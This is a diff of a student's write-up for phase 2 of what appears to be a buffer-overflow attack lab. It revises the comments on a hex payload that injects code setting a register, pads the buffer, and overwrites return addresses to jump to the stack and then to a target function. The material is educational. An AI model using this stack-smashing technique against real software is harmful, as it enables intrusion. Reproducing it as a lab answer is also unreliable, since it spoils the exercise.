@@ -133,12 +133,12 @@ so we modify
 
 ```txt
 # FIle phase2.txt
-
+# This is when getbuf call Gets() -> right time modify %rdi
 48 c7 c7 fa 97 b9 59 c3 #inject code written to top of stack
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 # next lower 32 Byte (make up to 40Byte) is padding
-78 dc 61 55 00 00 00 00 # true return address of getbuf after call Gets()
-ec 17 40 00 00 00 00 00 # overwrite return address of ret line (where getbuf return to)
+78 dc 61 55 00 00 00 00 # this is actually address which %rdi saved before modified, it trigger when getbuf() do ret func, which execute first line of buf (injected code)
+ec 17 40 00 00 00 00 00 # overwrite return address second time, return to touch2
 ```
